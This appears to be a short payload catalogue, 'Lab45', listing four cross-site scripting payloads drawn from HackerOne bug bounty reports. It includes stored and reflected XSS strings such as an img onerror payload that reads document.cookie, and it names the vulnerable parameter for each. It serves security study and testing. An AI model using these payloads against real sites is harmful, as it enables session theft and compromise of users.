# Lab45

4 payloads.

### `a833ac2a`

```
<script>alert()</script>
```

**Parameter:** `content`
— [Stored-Xss at target.com/projects/ affected on project chat members](https://hackerone.com/reports/779908) · Lab45 · [hundredpercent](https://hackerone.com/hundredpercent)

### `c9372c80`

```
https://target.com/wiki/pages/createpage.action?spaceKey=tcwiki&parentPageString=powerpuff_hackerone%22%3E%3Cimg%20src=X%20onerror=alert(document.cookie
```

**Parameter:** `parentPageString`
— [Reflected XSS on https://target.com/wiki/pages/createpage.action](https://hackerone.com/reports/866576) · Lab45 · [meryem0x](https://hackerone.com/meryem0x)

### `f5e3eb88`

```
)%3E&labelsString=%22%3E%3Cimg+src%3DX+onerror%3Dalert(document.domain)%3E
```

**Parameter:** `labelsString`
— [Reflected XSS on https://target.com/wiki/pages/createpage.action](https://hackerone.com/reports/866576) · Lab45 · [meryem0x](https://hackerone.com/meryem0x)

### `1908bd41`

```
5. At the end of the URL (at the end of the &so=&o=) write 1"><h1>DOM XSS by c0mbo</h1>
```

**Parameter:** `o`
— [\[redacted\]](https://hackerone.com/reports/1194301) · Lab45 · [c0mbo](https://hackerone.com/c0mbo)
